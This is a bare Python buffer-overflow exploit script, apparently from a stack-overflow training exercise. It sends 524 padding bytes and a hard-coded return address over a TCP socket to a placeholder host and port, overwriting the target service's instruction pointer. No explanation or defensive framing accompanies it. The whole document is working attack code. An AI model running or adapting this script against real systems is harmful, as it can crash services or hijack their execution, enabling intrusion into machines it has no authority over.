import sys , socket 



buffer = b"A" * 524 + b"\xf3\x12\x17\x31"


payload= buffer + b'\r\n'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('x.x.x.x',xxxx))
s.send(payload)
s.close()

sys.exit()